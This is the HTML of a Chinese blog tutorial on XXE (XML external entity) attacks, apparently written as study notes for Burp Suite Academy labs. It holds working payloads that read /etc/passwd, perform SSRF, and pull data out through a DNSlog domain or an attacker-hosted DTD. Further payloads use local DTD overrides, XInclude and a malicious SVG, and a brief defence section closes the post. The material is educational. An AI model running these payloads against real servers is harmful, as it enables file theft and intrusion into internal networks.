@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="XXE的几种利用 利用XXE获取文件 利用XXE实现SSRF攻击 在XXE无回显的情况下，外带数据 在XXE无回显的情况下，利用错误信息获取数据  利用XXE获取文件利用XXE获取服务器上的任意文件需要以下两个条件：  声明一个外部实体A，该实体包含要获取的文件路径。 修改XML中的某个会被应用处理后返回的数据变量B，使其使用定义好的实体A。  下面是一个正常的XML数据 12&lt;?xml v">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burpsuite Academy系列教程-XXE">
+<meta property="og:url" content="http://example.com/2021/08/17/2021-08-17-XXE/index.html">
+<meta property="og:site_name" content="想逃避现实的芝麻糊">
+<meta property="og:description" content="XXE的几种利用 利用XXE获取文件 利用XXE实现SSRF攻击 在XXE无回显的情况下，外带数据 在XXE无回显的情况下，利用错误信息获取数据  利用XXE获取文件利用XXE获取服务器上的任意文件需要以下两个条件：  声明一个外部实体A，该实体包含要获取的文件路径。 修改XML中的某个会被应用处理后返回的数据变量B，使其使用定义好的实体A。  下面是一个正常的XML数据 12&lt;?xml v">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-08-16T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-01-22T11:31:08.173Z">
+<meta property="article:author" content="芝麻糊">
+<meta property="article:tag" content="Burpsuite Academy系列教程">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo.ico" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.ico">
+        
+      
+    
+    <!-- title -->
+    <title>Burpsuite Academy系列教程-XXE</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2021/08/19/2021-08-19-Access%20control/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2021/04/09/2021-04-09-SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/17/2021-08-17-XXE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/17/2021-08-17-XXE/&text=Burpsuite Academy系列教程-XXE"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/17/2021-08-17-XXE/&is_video=false&description=Burpsuite Academy系列教程-XXE"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Burpsuite Academy系列教程-XXE&body=Check out this article: http://example.com/2021/08/17/2021-08-17-XXE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/17/2021-08-17-XXE/&name=Burpsuite Academy系列教程-XXE&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/17/2021-08-17-XXE/&t=Burpsuite Academy系列教程-XXE"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">XXE的几种利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XXE%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">利用XXE获取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XXE%E5%AE%9E%E7%8E%B0SSRF"><span class="toc-number">1.2.</span> <span class="toc-text">利用XXE实现SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEXXE%EF%BC%88blind-XXE%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">无回显XXE（blind XXE）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF%EF%BC%88out-fof-band-OAST%EF%BC%89%E5%88%A9%E7%94%A8XXE"><span class="toc-number">1.3.1.</span> <span class="toc-text">结合外带数据技术（out-fof-band,OAST）利用XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">通过错误信息获取数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E8%BF%9B%E8%A1%8CXXE"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用本地DTD进行XXE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84XXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">隐藏的XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XInclude%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.1.</span> <span class="toc-text">利用XInclude进行XXE攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.2.</span> <span class="toc-text">利用文件上传进行XXE攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E5%8C%85conten-type%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.3.</span> <span class="toc-text">修改请求包conten-type进行XXE攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1XXE%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">如何防御XXE？</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Burpsuite Academy系列教程-XXE
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">c-uncle</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-08-16T16:00:00.000Z" itemprop="datePublished">2021-08-17</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Burpsuite-Academy%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B/" rel="tag">Burpsuite Academy系列教程</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="XXE的几种利用"><a href="#XXE的几种利用" class="headerlink" title="XXE的几种利用"></a>XXE的几种利用</h2><ol>
+<li>利用XXE获取文件</li>
+<li>利用XXE实现SSRF攻击</li>
+<li>在XXE无回显的情况下，外带数据</li>
+<li>在XXE无回显的情况下，利用错误信息获取数据</li>
+</ol>
+<h3 id="利用XXE获取文件"><a href="#利用XXE获取文件" class="headerlink" title="利用XXE获取文件"></a>利用XXE获取文件</h3><p>利用XXE获取服务器上的任意文件需要以下两个条件：</p>
+<ul>
+<li>声明一个外部实体A，该实体包含要获取的文件路径。</li>
+<li>修改XML中的某个会被应用处理后返回的数据变量B，使其使用定义好的实体A。</li>
+</ul>
+<p>下面是一个正常的XML数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;381&lt;/productId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>
+
+<p>假设我们要获取/etc/passwd，我们可以构造下面的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;</span><br><span class="line">&lt;stockCheck&gt;&lt;productId&gt;&amp;xxe;&lt;/productId&gt;&lt;/stockCheck&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Note：</strong> 有时候XML中可能有很多个数据，但并不是每一个数据都会被返回，因此我们需要耐心地一个个试。</p>
+<h3 id="利用XXE实现SSRF"><a href="#利用XXE实现SSRF" class="headerlink" title="利用XXE实现SSRF"></a>利用XXE实现SSRF</h3><p>利用XXE实现SSRF的条件和获取文件是大致相同的，区别在于将文件路径改为目标的URL。</p>
+<p>可以使用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://internal.vulnerable-website.com/&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="无回显XXE（blind-XXE）"><a href="#无回显XXE（blind-XXE）" class="headerlink" title="无回显XXE（blind XXE）"></a>无回显XXE（blind XXE）</h3><p>有两种方法可以找到blind XXE。</p>
+<ul>
+<li>利用外带数据技术获取敏感数据，例如：利用DNSLog探测是否有XXE或利用ceye获取数据</li>
+<li>通过触发XML的解析错误，使得错误信息中带有敏感数据</li>
+</ul>
+<h4 id="结合外带数据技术（out-fof-band-OAST）利用XXE"><a href="#结合外带数据技术（out-fof-band-OAST）利用XXE" class="headerlink" title="结合外带数据技术（out-fof-band,OAST）利用XXE"></a>结合外带数据技术（out-fof-band,OAST）利用XXE</h4><p>利用DNSlog来验证是否存在XXE。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM &quot;http://[DNSlog域名]/&quot;&gt; ]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>有时候，应用会阻止用户在XML中使用常规实体，这时我们可以使用参数实体来进行攻击。</p>
+<p>使用参数实体攻击需要知道两件事。</p>
+<ul>
+<li><p>参数实体的定义如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http://tqymov.dnslog.cn&quot;&gt;</span><br></pre></td></tr></table></figure></li>
+<li><p>参数实体的引用如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE stockCheck [&lt;!ENTITY % xxe SYSTEM &quot;http://tqymov.dnslog.cn&quot;&gt; %xxe; ]&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>参数实体和常规实体在使用上的区别就是在实体名前加%，并且参数实体的引用是放在&lt;!DOCTYPE&gt;中的。</p>
+<h4 id="通过错误信息获取数据"><a href="#通过错误信息获取数据" class="headerlink" title="通过错误信息获取数据"></a>通过错误信息获取数据</h4><p>发送给目标服务器的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line"> &lt;!ENTITY % goodies SYSTEM &quot;https://[my-ip]/exploit&quot;&gt;</span><br><span class="line">%goodies;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我的服务器存放的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>
+
+<p>观察第二个payload的第二行，可以看到调用file协议访问了一个不存在的路径，导致出错，同时%file的内容就是我们要读取的文件内容。由于返回的错误信息会显示我们请求的路径，也就导致了文件内容被外带出来。</p>
+<p>有点像SQL注入里的报错注入。</p>
+<h4 id="利用本地DTD进行XXE"><a href="#利用本地DTD进行XXE" class="headerlink" title="利用本地DTD进行XXE"></a>利用本地DTD进行XXE</h4><p>假设目标服务器上存在一个DTD文件/tmp/xxx.dtd，并且文件中有一个实体名叫abc，那么我们可以构造以下payload来触发XML解析错误并获取数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line"> &lt;!ENTITY % localDtd SYSTEM &quot;/tmp/xxx.dtd&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % abc &#x27;</span><br><span class="line">&lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">&amp;#x25;eval;</span><br><span class="line">&amp;#x25;error;</span><br><span class="line">&#x27;&gt;</span><br><span class="line">%localDtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>原理是新的abc实体会覆盖/tmp/xxx.dtd中的abc，从而触发解析错误。</p>
+<p>我认为在XML中定义的abc是内部实体，但是由于localDtd引入的/tmp/xxx.dtd，并且/tmp/xxx.dtd中的abc实体属于外部实体。</p>
+<p>这时内部实体abc会覆盖外部实体abc的内容，但是却保留了外部实体abc的特性，解析器会认为内部实体abc是一个外部实体。</p>
+<p><strong>注意：XML规范是不允许内部实体引用参数实体的。</strong></p>
+<h2 id="隐藏的XXE攻击"><a href="#隐藏的XXE攻击" class="headerlink" title="隐藏的XXE攻击"></a>隐藏的XXE攻击</h2><p>有时候我们并不能直接地向服务器发送XML数据，但这不代表不存在XXE攻击。</p>
+<p>下面介绍几种特别的攻击方法：</p>
+<h4 id="利用XInclude进行XXE攻击"><a href="#利用XInclude进行XXE攻击" class="headerlink" title="利用XInclude进行XXE攻击"></a>利用XInclude进行XXE攻击</h4><p>有些应用会将用户提交的参数填充进XML中，并解析该XML。虽然这可能存在XXE漏洞，但是由于我们无法定义实体，也就无法向前面一样实现攻击。</p>
+<p>这时我们可以利用XInclude来实现XXE攻击，XML允许在XML文档中再建立一个子文档。这意味着我们可以将带有恶意payload的XML文档嵌入在原XML文档中，从而实现XXE攻击。</p>
+<p>要使用XInclude攻击，我们可以按照下面的模板，来构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="利用文件上传进行XXE攻击"><a href="#利用文件上传进行XXE攻击" class="headerlink" title="利用文件上传进行XXE攻击"></a>利用文件上传进行XXE攻击</h4><p>有些应用允许用户上传文件，而有些文件是带有XML的，例如DOCX和SVG（<strong>SVG 是一种基于 XML 语法的图像格式，全称是可缩放矢量图（Scalable Vector Graphics）</strong>）。</p>
+<p>这些文件上传到服务器上后，应用对这类文件进行解析，从而触发XXE攻击。</p>
+<p>SVG文件有效的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;</span><br><span class="line">&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;</span><br><span class="line">&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="修改请求包conten-type进行XXE攻击"><a href="#修改请求包conten-type进行XXE攻击" class="headerlink" title="修改请求包conten-type进行XXE攻击"></a>修改请求包conten-type进行XXE攻击</h4><p>通过POST请求默认使用HTML表格，例如application/x-www-form-urlencoded，但有些应用可以兼容XML格式。</p>
+<p>例如原先的请求如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>
+
+<p>我们将其改成XML格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /action HTTP/1.0</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果目标服务器兼容XML格式的数据，那么我们的XML请求就会被解析，并且和HTML表格一样有效。</p>
+<h2 id="如何防御XXE？"><a href="#如何防御XXE？" class="headerlink" title="如何防御XXE？"></a>如何防御XXE？</h2><p>XXE的本质是XML解析器支持一些不常用且存在潜在风险的功能。</p>
+<p>防御XXE最有效的方法就是禁用外部实体和XInclude功能。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E7%9A%84%E5%87%A0%E7%A7%8D%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">XXE的几种利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XXE%E8%8E%B7%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">利用XXE获取文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XXE%E5%AE%9E%E7%8E%B0SSRF"><span class="toc-number">1.2.</span> <span class="toc-text">利用XXE实现SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BEXXE%EF%BC%88blind-XXE%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">无回显XXE（blind XXE）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%8A%80%E6%9C%AF%EF%BC%88out-fof-band-OAST%EF%BC%89%E5%88%A9%E7%94%A8XXE"><span class="toc-number">1.3.1.</span> <span class="toc-text">结合外带数据技术（out-fof-band,OAST）利用XXE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text">通过错误信息获取数据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9C%AC%E5%9C%B0DTD%E8%BF%9B%E8%A1%8CXXE"><span class="toc-number">1.3.3.</span> <span class="toc-text">利用本地DTD进行XXE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%9A%84XXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">隐藏的XXE攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8XInclude%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.1.</span> <span class="toc-text">利用XInclude进行XXE攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.2.</span> <span class="toc-text">利用文件上传进行XXE攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E8%AF%B7%E6%B1%82%E5%8C%85conten-type%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB"><span class="toc-number">2.0.3.</span> <span class="toc-text">修改请求包conten-type进行XXE攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1XXE%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">如何防御XXE？</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2021/08/17/2021-08-17-XXE/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2021/08/17/2021-08-17-XXE/&text=Burpsuite Academy系列教程-XXE"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2021/08/17/2021-08-17-XXE/&is_video=false&description=Burpsuite Academy系列教程-XXE"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Burpsuite Academy系列教程-XXE&body=Check out this article: http://example.com/2021/08/17/2021-08-17-XXE/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2021/08/17/2021-08-17-XXE/&title=Burpsuite Academy系列教程-XXE"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2021/08/17/2021-08-17-XXE/&name=Burpsuite Academy系列教程-XXE&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2021/08/17/2021-08-17-XXE/&t=Burpsuite Academy系列教程-XXE"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
